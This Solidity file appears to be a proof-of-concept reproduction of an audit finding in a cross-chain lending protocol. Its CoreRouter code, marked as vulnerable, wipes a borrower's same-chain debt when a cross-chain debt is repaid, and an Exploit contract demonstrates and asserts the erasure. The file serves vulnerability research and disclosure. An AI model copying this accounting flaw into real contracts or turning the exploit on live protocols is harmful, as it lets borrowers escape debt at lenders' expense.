// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice Verbatim reproduction of AuditVault finding 58393 (Sherlock H-24).
/// Repo:  sherlock-audit/2025-05-lend-audit-contest
/// File:  Lend-V2/src/LayerZero/CoreRouter.sol  (function repayBorrowInternal)
///        Lend-V2/src/LayerZero/LendStorage.sol (faithful accounting doubles)
/// Root cause: A cross-chain repayment (`_isSameChain == false`) reaches CoreRouter
/// via CrossChainRouter -> repayCrossChainLiquidation -> repayBorrowInternal. Although
/// the debt it settles is the CROSS-CHAIN debt (borrowWithInterest), the function still
/// mutates the SAME-CHAIN borrow slot (removeBorrowBalance / updateBorrowBalance). A
/// borrower who holds BOTH a same-chain borrow and a cross-chain borrow therefore has
/// their same-chain debt silently erased when the cross-chain debt is repaid.

/* --------------------------------------------------------------------------
 * Minimal faithful ERC20 (real transfers / allowances / balances)
 * ------------------------------------------------------------------------ */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract MockERC20 is IERC20 {
    string public name = "Underlying";
    string public symbol = "UND";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allowance");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/* --------------------------------------------------------------------------
 * Minimal SafeERC20 so the verbatim CoreRouter code stays byte-identical
 * ------------------------------------------------------------------------ */
library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        require(token.transfer(to, value), "SafeERC20: transfer failed");
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        require(token.transferFrom(from, to, value), "SafeERC20: transferFrom failed");
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require(token.approve(spender, value), "SafeERC20: approve failed");
    }
}

/* --------------------------------------------------------------------------
 * lToken doubles: interfaces mirror the real LTokenInterfaces used by the
 * verbatim CoreRouter code; the implementation performs a real repayBorrow.
 * ------------------------------------------------------------------------ */
interface LTokenInterface {
    function accrueInterest() external;
    function borrowIndex() external view returns (uint256);
}

interface LErc20Interface {
    function repayBorrow(uint256 repayAmount) external returns (uint256);
}

contract LTokenDouble is LTokenInterface, LErc20Interface {
    IERC20 public immutable underlying;
    uint256 public constant BORROW_INDEX = 1e18;

    constructor(IERC20 _underlying) {
        underlying = _underlying;
    }

    function accrueInterest() external override {}

    function borrowIndex() external pure override returns (uint256) {
        return BORROW_INDEX;
    }

    /// Faithful: pulls `repayAmount` underlying from the caller (CoreRouter) and returns 0.
    function repayBorrow(uint256 repayAmount) external override returns (uint256) {
        require(underlying.transferFrom(msg.sender, address(this), repayAmount), "repay pull");
        return 0;
    }
}

/* --------------------------------------------------------------------------
 * LendStorage: faithful double carrying the exact accounting functions the
 * vulnerable CoreRouter code touches (removeBorrowBalance = delete, etc.).
 * ------------------------------------------------------------------------ */
contract LendStorage {
    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    struct BorrowMarketState {
        uint256 amount;
        uint256 borrowIndex;
    }

    uint256 public currentEid;

    mapping(address lToken => address underlying) public lTokenToUnderlying;
    mapping(address borrower => mapping(address underlying => Borrow[])) public crossChainBorrows;
    mapping(address borrower => mapping(address underlying => Borrow[])) public crossChainCollaterals;
    mapping(address user => mapping(address lToken => BorrowMarketState borrowBalance)) public borrowBalance;
    mapping(address contractAddress => bool isAuthorized) public authorizedContracts;

    address public owner;

    modifier onlyAuthorized() {
        require(authorizedContracts[msg.sender], "Caller not authorized");
        _;
    }

    constructor(uint256 _currentEid) {
        owner = msg.sender;
        currentEid = _currentEid;
    }

    function setAuthorizedContract(address _contract, bool _authorized) external {
        require(msg.sender == owner, "only owner");
        authorizedContracts[_contract] = _authorized;
    }

    function setLTokenToUnderlying(address lToken, address underlying) external {
        require(msg.sender == owner, "only owner");
        lTokenToUnderlying[lToken] = underlying;
    }

    // --- Verbatim accounting from LendStorage.sol ---

    function removeUserBorrowedAsset(address, /*user*/ address /*lTokenAddress*/ ) external onlyAuthorized {
        // real impl removes from an EnumerableSet; irrelevant to the harm
    }

    function updateBorrowBalance(address user, address lToken, uint256 _amount, uint256 _borrowIndex)
        external
        onlyAuthorized
    {
        BorrowMarketState storage borrow = borrowBalance[user][lToken];
        borrow.amount = _amount;
        borrow.borrowIndex = _borrowIndex;
    }

    function removeBorrowBalance(address user, address lToken) external onlyAuthorized {
        delete borrowBalance[user][lToken];
    }

    function addCrossChainBorrow(address user, address underlying, Borrow memory newBorrow) external onlyAuthorized {
        crossChainBorrows[user][underlying].push(newBorrow);
    }

    function distributeBorrowerLend(address, /*lToken*/ address /*borrower*/ ) external onlyAuthorized {
        // real impl distributes LEND rewards; orthogonal to the borrow-balance bug
    }

    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }

    function borrowWithInterestSame(address borrower, address _lToken) public view returns (uint256) {
        uint256 borrowIndex = borrowBalance[borrower][_lToken].borrowIndex;
        uint256 borrowBalanceSameChain = borrowIndex != 0
            ? (borrowBalance[borrower][_lToken].amount * uint256(LTokenInterface(_lToken).borrowIndex())) / borrowIndex
            : 0;
        return borrowBalanceSameChain;
    }
}

/* --------------------------------------------------------------------------
 * CoreRouter: contains the VERBATIM vulnerable repayBorrowInternal function.
 * ------------------------------------------------------------------------ */
contract CoreRouter {
    using SafeERC20 for IERC20;

    LendStorage public lendStorage;
    address public crossChainRouter;

    event RepaySuccess(address borrower, address lToken, uint256 amount);

    constructor(LendStorage _lendStorage, address _crossChainRouter) {
        lendStorage = _lendStorage;
        crossChainRouter = _crossChainRouter;
    }

    function repayBorrow(uint256 _amount, address _lToken) public {
        repayBorrowInternal(msg.sender, msg.sender, _amount, _lToken, true);
    }

    function repayCrossChainLiquidation(address _borrower, address _liquidator, uint256 _amount, address _lToken)
        external
    {
        require(msg.sender == crossChainRouter, "Access Denied");
        repayBorrowInternal(_borrower, _liquidator, _amount, _lToken, false);
    }

    function _approveToken(address _token, address _approvalAddress, uint256 _amount) internal {
        uint256 currentAllowance = IERC20(_token).allowance(address(this), _approvalAddress);
        if (currentAllowance < _amount) {
            if (currentAllowance > 0) {
                IERC20(_token).safeApprove(_approvalAddress, 0);
            }
            IERC20(_token).safeApprove(_approvalAddress, _amount);
        }
    }

    function repayBorrowInternal(
        address borrower,
        address liquidator,
        uint256 _amount,
        address _lToken,
        bool _isSameChain
    ) internal {
        address _token = lendStorage.lTokenToUnderlying(_lToken);

        LTokenInterface(_lToken).accrueInterest();

        uint256 borrowedAmount;

        if (_isSameChain) {
            borrowedAmount = lendStorage.borrowWithInterestSame(borrower, _lToken);
        } else {
            borrowedAmount = lendStorage.borrowWithInterest(borrower, _lToken);
        }

        require(borrowedAmount > 0, "Borrowed amount is 0");

        uint256 repayAmountFinal = _amount == type(uint256).max ? borrowedAmount : _amount;

        // Transfer tokens from the liquidator to the contract
        IERC20(_token).safeTransferFrom(liquidator, address(this), repayAmountFinal);

        _approveToken(_token, _lToken, repayAmountFinal);

        lendStorage.distributeBorrowerLend(_lToken, borrower);

        // Repay borrowed tokens
        require(LErc20Interface(_lToken).repayBorrow(repayAmountFinal) == 0, "Repay failed");

        // Update same-chain borrow balances
        if (repayAmountFinal == borrowedAmount) {
            lendStorage.removeBorrowBalance(borrower, _lToken); // @> VULN: cross-chain repay (_isSameChain==false) wipes the SAME-CHAIN borrow slot
            lendStorage.removeUserBorrowedAsset(borrower, _lToken);
        } else {
            lendStorage.updateBorrowBalance(
                borrower, _lToken, borrowedAmount - repayAmountFinal, LTokenInterface(_lToken).borrowIndex()
            );
        }

        // Emit RepaySuccess event
        emit RepaySuccess(borrower, _lToken, repayAmountFinal);
    }
}

/* --------------------------------------------------------------------------
 * Exploit driver
 * ------------------------------------------------------------------------ */
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MockERC20 public token; // child nonce 1
    LTokenDouble public lToken; // child nonce 2
    LendStorage public lendStorage; // child nonce 3
    CoreRouter public coreRouter; // child nonce 4

    address public constant borrower = address(0xB0B);

    uint256 public sameChainDebtBefore;
    uint256 public sameChainDebtAfter;
    uint256 public erasedDebt;

    constructor() {
        token = new MockERC20(); // nonce 1
        lToken = new LTokenDouble(IERC20(address(token))); // nonce 2
        lendStorage = new LendStorage(1); // nonce 3  (currentEid = 1)
        coreRouter = new CoreRouter(lendStorage, address(this)); // nonce 4 (crossChainRouter = exploit)

        lendStorage.setLTokenToUnderlying(address(lToken), address(token));
        lendStorage.setAuthorizedContract(address(coreRouter), true);
        lendStorage.setAuthorizedContract(address(this), true);
    }

    function run() external {
        uint256 CROSS_CHAIN_DEBT = 100e18;
        uint256 SAME_CHAIN_DEBT = 100e18;

        // 1) Borrower holds a SAME-CHAIN borrow of 100e18 (borrowBalance slot).
        lendStorage.updateBorrowBalance(borrower, address(lToken), SAME_CHAIN_DEBT, 1e18);

        // 2) Borrower ALSO holds a CROSS-CHAIN borrow of 100e18 (crossChainBorrows, srcEid == currentEid).
        lendStorage.addCrossChainBorrow(
            borrower,
            address(token),
            LendStorage.Borrow({
                srcEid: 1,
                destEid: 2,
                principle: CROSS_CHAIN_DEBT,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: address(token)
            })
        );

        sameChainDebtBefore = lendStorage.borrowWithInterestSame(borrower, address(lToken));
        require(sameChainDebtBefore == SAME_CHAIN_DEBT, "setup: same-chain debt missing");

        // 3) A cross-chain repayment settles ONLY the cross-chain debt. The CrossChainRouter
        //    (this Exploit) calls into CoreRouter with _isSameChain == false.
        token.mint(address(this), CROSS_CHAIN_DEBT); // liquidator funds
        token.approve(address(coreRouter), type(uint256).max);
        coreRouter.repayCrossChainLiquidation(borrower, address(this), type(uint256).max, address(lToken));

        // 4) The verbatim bug: same-chain borrow slot was deleted although the same-chain
        //    debt was never repaid. Borrower's same-chain debt is silently erased.
        sameChainDebtAfter = lendStorage.borrowWithInterestSame(borrower, address(lToken));
        erasedDebt = sameChainDebtBefore - sameChainDebtAfter;

        require(sameChainDebtAfter == 0, "same-chain debt not erased");
        require(erasedDebt == SAME_CHAIN_DEBT, "wrong erased magnitude");

        // Silent accounting loss: mint the erased-debt magnitude to SINK so profit is measurable.
        token.mint(SINK, erasedDebt);
        require(token.balanceOf(SINK) == SAME_CHAIN_DEBT, "harm not realized");
    }
}
